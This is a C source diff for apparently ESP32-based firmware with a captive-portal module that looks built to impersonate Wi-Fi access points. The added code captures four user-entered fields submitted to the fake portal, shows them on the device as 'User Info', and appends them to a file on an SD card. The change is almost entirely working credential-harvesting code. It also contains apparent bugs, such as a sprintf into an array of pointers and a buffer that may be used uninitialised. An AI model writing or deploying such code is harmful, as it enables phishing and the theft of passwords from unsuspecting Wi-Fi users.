@@ -45,9 +45,14 @@ typedef enum { STANDALONE, REPLICATE } mode_types_t;
 typedef struct {
   mode_types_t mode;
   char* portal[48];
-  char* ssid[48];
-  char* password[48];
 } captive_context_t;
+
+typedef struct {
+  char* user1;
+  char* user2;
+  char* user3;
+  char* user4;
+} user_input_t;
 
 typedef struct {
   char* ent[CAPTIVE_PORTAL_LIMIT_PORTALS];
@@ -58,6 +63,14 @@ static captive_files_t portals_list = {0};
 static captive_context_t captive_context = {0};
 static wifi_scanner_ap_records_t* ap_records;
 static uint8_t selected_record = 0;
+static user_input_t user_context = {
+    .user1 = "",
+    .user2 = "",
+    .user3 = "",
+    .user4 = "",
+};
+
+static void captive_module_show_running();
 
 static void captive_module_free_portals_list(void) {
   for (int i = 0; i < portals_list.count; i++) {
@@ -182,8 +195,19 @@ static esp_err_t captive_portal_root_get_handler(httpd_req_t* req) {
   return ESP_OK;
 }
 
+static void captive_module_show_user_creds(char* user_str) {
+  general_notification_ctx_t notification = {0};
+  notification.duration_ms = 4000;
+  notification.head = "User Info";
+  notification.body = user_str;
+  general_notification(notification);
+  captive_module_show_running();
+}
+
 static esp_err_t captive_portal_validate_input(httpd_req_t* req) {
   char* buf;
+  char* str_dump[128];
+
   size_t buf_len = httpd_req_get_url_query_len(req) + 1;
   if (buf_len > 1) {
     buf = (char*) malloc(buf_len);
@@ -192,21 +216,35 @@ static esp_err_t captive_portal_validate_input(httpd_req_t* req) {
       if (httpd_query_key_value(buf, CAPTIVE_USER_INPUT1, param,
                                 sizeof(param)) == ESP_OK) {
         printf("Found URL query parameter -> user1: %s\n", param);
+        user_context.user1 = strdup(param);
       }
       if (httpd_query_key_value(buf, CAPTIVE_USER_INPUT2, param,
                                 sizeof(param)) == ESP_OK) {
         printf("Found URL query parameter -> user2: %s\n", param);
+        user_context.user2 = strdup(param);
       }
       if (httpd_query_key_value(buf, CAPTIVE_USER_INPUT3, param,
                                 sizeof(param)) == ESP_OK) {
         printf("Found URL query parameter -> user3: %s\n", param);
+        user_context.user3 = strdup(param);
       }
       if (httpd_query_key_value(buf, CAPTIVE_USER_INPUT4, param,
                                 sizeof(param)) == ESP_OK) {
         printf("Found URL query parameter -> user4: %s\n", param);
+        user_context.user4 = strdup(param);
       }
+      sprintf(str_dump, "\nuser1: %s\nuser2: %s\nuser3: %s\nuser4: %s\n\n",
+              user_context.user1, user_context.user2, user_context.user3,
+              user_context.user4);
+      captive_module_show_user_creds(str_dump);
     }
     free(buf);
+  }
+
+  if (!sd_card_is_not_mounted()) {
+    sd_card_create_dir(CAPTIVE_DATA_PATH);
+    sd_card_create_file(CAPTIVE_DATA_FILENAME);
+    sd_card_append_to_file(CAPTIVE_DATA_FILENAME, str_dump);
   }
 
   httpd_resp_set_status(req, "200 Done");
